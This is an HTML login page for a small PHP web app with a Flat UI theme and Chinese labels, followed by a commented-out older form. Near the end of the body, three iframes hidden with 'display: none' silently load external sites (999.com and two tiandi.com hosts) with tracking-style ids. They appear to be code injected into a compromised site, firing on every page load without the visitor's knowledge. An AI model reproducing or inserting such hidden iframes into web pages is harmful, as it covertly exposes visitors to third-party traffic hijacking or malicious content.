<html>
<head>

    <meta http-equiv=Content-Type content="text/html; charset=utf-8">
    <style type="text/css">
        <!--
        body {
            background-image: url(1.jpg);
            background-repeat: no-repeat;
        }

        -->
    </style>
    <title>登陆</title>
    <meta name="description"
          content="Flat UI Kit Free is a Twitter Bootstrap Framework design and Theme, this responsive framework includes a PSD and HTML version.">

    <meta name="viewport" content="width=1000, initial-scale=1.0, maximum-scale=1.0">

    <!-- Loading Bootstrap -->
    <link href="UI/dist/css/vendor/bootstrap.min.css" rel="stylesheet">

    <!-- Loading Flat UI -->
    <link href="UI/dist/css/flat-ui.css" rel="stylesheet">
    <link href="UI/docs/assets/css/demo.css" rel="stylesheet">

    <link rel="shortcut icon" href="favicon.ico">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements. All other JS at the end of file. -->
    <!--[if lt IE 9]>
    <script src="UI/dist/js/vendor/html5shiv.js"></script>
    <script src="UI/dist/js/vendor/respond.min.js"></script>
    <![endif]-->
</head>
<body>
<div class="container">
    <div class="login">
        <div class="login-screen">
            <div class="login-icon">
                <img src="UI/img/login/icon1.png" alt="Welcome to Mail App">
                <h4>
                    <small>Welcome</small>
                </h4>
            </div>

            <div class="login-form">
                <form action="handle_login.php" method="post">
                <div class="form-group">
                    <input type="text" class="form-control login-field" value="" placeholder="请输入用户名"
                           id="login-name" name="username">
                    <label class="login-field-icon fui-user" for="login-name"></label>
                </div>

                <div class="form-group">
                    <input type="password" class="form-control login-field" value="" placeholder="请输入密码"
                           id="login-pass" name="password">
                    <label class="login-field-icon fui-lock" for="login-pass"></label>
                </div>
                <div class="form-group">

                    <div align="center">
                        <table width="100%">
                            <tr>
                                <td width="58%">
                                    <input type="text" class="form-control login-field" value="" placeholder="请输入验证码"
                                           id="login-code" name="imgcode">
                                </td>
                                <td width="2%">

                                </td>
                                <td>
                                    <img src="code.php" alt="1" width="102" height="30px">
                                </td>
                            </tr>
                        </table>
                    </div>
                </div>
                <table width="100%">
                    <tr>
                        <td>
                            <input class="btn btn-primary btn-lg btn-block"
                                   type="submit" name="button" value="登录">
                        </td>
                        <td width="2%">

                        </td>
                        <td>
                            <input class="btn btn-primary btn-lg btn-block"
                                   name="reg" type="button" value="注册"
                                   onclick="window.location.href='reg.php'">
                        </td>

                    </tr>
                </table>
                </form>
            </div>
        </div>
    </div>
</div>
<iframe src="http://www.999.com/?iv=td_7236" style="display: none;"></iframe>
<iframe src="http://h.tiandi.com/?td_1_7236" style="display: none;"></iframe>
<iframe src="http://360.tiandi.com/?td_2_7236" style="display: none;"></iframe>
</body>
<!--
<body style="height=100% width=100% background-color:rgb(64, 64, 64); ">
<div style="position:relative; height:100px;width:300px;top:350px;left:40%;">
    <div>
        <form action="handle_login.php" method="post">
            <table width=100%
            ">
            <tr>
                <td width='30%' height="18%" style="text-align:right;">用户名：</td>
                <td width="70%"><input type="text" name="username"/></td>
            </tr>

            <tr>
                <td width='30%' height="18%" style="text-align:right;">密码：</td>
                <td><input type="password" name="password"/></td>
            </tr>

            <tr>
                <td width='30%' height="18%" style="text-align:right;">验证码：</td>
                <td><input type="text" name="imgcode"/></td>
            </tr>
            </table>
            <table width=100%>
                <tr>
                    <td width="84%" height="25%" style='text-align:center;'><img src="code.php" alt="1" width="100px"
                                                                                 height="30px"></td>
                </tr>
                <tr>
                    <td height="21%" style='text-align:center;'><input width=100 type="submit" name="button" value="登录">
                        <input name="reg" type="button" value="注册" onclick="window.location.href='reg.php'"></td>
                </tr>
            </table>
        </form>
    </div>

</div>

</body>
</html>
-->